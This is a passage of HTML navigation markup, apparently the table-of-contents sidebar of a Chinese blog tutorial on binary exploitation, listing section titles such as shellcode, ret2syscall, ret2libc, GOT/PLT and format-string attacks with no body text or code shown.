href="#%E5%B8%83%E5%B1%80%E6%A0%88%E7%A9%BA%E9%97%B4"><span class="nav-number">1.10.5.1.2.</span> <span class="nav-text">布局栈空间</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pwn"><span class="nav-number">1.10.5.1.3.</span> <span class="nav-text">pwn</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">1.10.6.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%88ret2syscall%EF%BC%89"><span class="nav-number">1.10.7.</span> <span class="nav-text">系统调用（ret2syscall）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#libc"><span class="nav-number">1.10.8.</span> <span class="nav-text">libc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ret2libc"><span class="nav-number">1.10.8.1.</span> <span class="nav-text">Ret2libc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="nav-number">1.10.8.2.</span> <span class="nav-text">动态链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8"><span class="nav-number">1.10.8.3.</span> <span class="nav-text">got表和plt表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%EF%BC%9A"><span class="nav-number">1.10.8.4.</span> <span class="nav-text">延迟绑定：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%9D%E8%B7%AF"><span class="nav-number">1.10.8.5.</span> <span class="nav-text">漏洞思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-1"><span class="nav-number">1.10.8.6.</span> <span class="nav-text">例题：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fmt"><span class="nav-number">1.10.9.</span> <span class="nav-text">fmt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">1.10.9.1.</span> <span class="nav-text">格式化字符串的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2"><span class="nav-number">1.10.9.1.1.</span> <span class="nav-text">泄露</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A6%86%E7%9B%96"><span class="nav-number">1.10.9.1.2.</span> <span class="nav-text">覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98"><span class="nav-number">1.10.9.1.2.1.</span> <span class="nav-text">覆盖栈内存</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98"><span class="nav-number">1.10.9.1.2.2.</span> <span class="nav-text">覆盖任意内存</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-2"><span class="nav-number">1.10.9.2.</span> <span class="nav-text">例题：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#fmt0%EF%BC%9A"><span class="nav-number">1.10.9.2.1.</span> <span class="nav-text">fmt0：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fmt1%EF%BC%9A"><span class="nav-number">1.10.9.2.2.</span> <span class="nav-text">fmt1：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
